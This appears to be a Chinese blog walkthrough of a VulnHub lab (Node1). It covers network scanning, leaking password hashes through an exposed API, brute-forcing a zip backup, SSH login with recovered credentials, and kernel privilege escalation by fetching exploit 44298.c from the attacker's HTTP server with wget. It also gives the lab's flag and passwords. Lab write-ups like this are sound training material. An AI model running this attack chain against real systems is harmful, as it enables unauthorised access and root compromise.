---
title: "vulnhub靶机渗透Node1"
onlyTitle: true
date: 2023-06-30 13:05:36
categories:
- 内网渗透
- 靶机
tags:
- 内网渗透
- vulnhub
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B882.png

---



# vulnhub靶机Node1

## 一、有效资产收集

| 资产编号 | 资产分类 | 资产名称       | 资产规格                                              | 访问地址        | 备注/问题                  |
| -------- | -------- | -------------- | ----------------------------------------------------- | --------------- | -------------------------- |
| Node1    | 主机系统 | Ubuntu操作系统 | Type:Linux<br />IP:192.168.101.137<br />Port:22、3000 | 192.168.101.137 | 越权，压缩包爆破，内核提权 |

flag：

==1722e99ca5f353b362556a62bd5e6be0==

靶机下载地址：https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)-1,252/

访问不到把网络模式改为NAT

## 二、渗透测试过程

kali攻击机ip为192.168.101.128

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png)

### 1. 信息收集

* 扫描存活主机：目标主机ip为192.168.101.137

```sh
arp-scan -l
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png)

或者Netdiscover

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png)



* 通过ping进行三层发现，根据ttl=64初步推测该主机为Linux

```sh
ping 192.168.101.137
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png)

* 通过masscan四层发现目标主机开放端口

```sh
masscan -p0-65535 --rate=10000 192.168.101.137
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png)

目标主机只开了两个端口，分别是22和3000端口



* 扫描目标端口服务

  ```sh
  nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A
  ```


![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png)

* 目标开启了以下端口及服务：
  * 22端口，服务为OpenSSH 7.2p2;且系统为Ubunru 4 ubuntu2.2
  * 3000端口，服务为Apache。且扫描到了/login路径，猜测是后台登录界面

> nodejs默认端口3000，且nodejs是一个基于Chrome JavaScript运行建立的一个平台，基于Google V8引擎，性能很好



使用Nmap中漏洞分类NSE脚本对目标进行探测

```sh
nmap -sV --script vuln 192.168.101.137
```

****

目标web服务为Node.js Express的站，其他漏洞信息没什么有效的，都是Dos（不算洞）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png)



访问目标3000端口 web服务：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png)



访问login路径：但是此页面没测出来弱密码和SQL

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png)



### 2. 越权

在首页源码闲逛时，看到在`view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js`下

```js
var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
```

>这段代码是一个AngularJS控制器，命名为HomeCtrl，接收scope和http两个参数。控制器中向服务器`/api/users/latest`发起GET请求，用then()处理相应并把数据赋给$scope.users

跟随路径到/api/users/latest，看到了用户名及其password的json数据，不过这里只有非管理员用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png)

再向上一级，找到管理员用户：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png)



将管理员用户`myP14ceAdminAcc0uNT`的密码`dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af`拿到somd5解密：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png)

密码为`manchester`

登录成功，网页中心有`Download backup`按钮

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png)

### 3. 爆破解压压缩包

下载下来看到是base64编码，解码：

```sh
base64 -d myplace.backup > decode.backup
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png)

文件类型为zip：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png)



解压需要密码：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png)



用fcrackzip，字典rockyou进行爆破：

```sh
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png)

密码为magicword



### 4. ssh登录

unzip解压后出现var文件夹：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png)

在app.js中定义的url常量，`mark:5AYRft73VtFpc84k@localhost:27017`很像ssh登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png)



尝试进行ssh登录：

```sh
ssh mark@192.168.101.137
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png)



### 5. ubuntu16.04内核提权

* 查看用户的sudo权限：

```sh
sudo -l
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png)

mark用户不能使用sudo

* 查看有suid的命令：

```sh
find / -perm -u=s -type f 2>/dev/null
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png)

没有find这种提权的命令



* 查看内核版本及操作系统版本：

```sh
uname -a
lsb_release -a
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png)

内核版本为4.4.0-93，系统版本为ubuntu16.04

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png)







* 查看是否存在gcc和版本

```sh
gcc --version
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png)



搜索ubuntu 16.04存在的漏洞：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png)



把exp下载到本地：

```sh
searchsploit -m 44298.c
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png)



本地用python起一个web服务：

```sh
python2 -m SimpleHTTPServer 8000
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png)



靶机上cd到tmp目录下载exp

```sh
cd /tmp
wget http://192.168.101.128:8000/44298.c
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png)



gcc编译执行exp:

```sh
gcc 44298.c -o exp
./exp
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png)



在/root目录下找到flag:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png)

flag:==1722e99ca5f353b362556a62bd5e6be0==

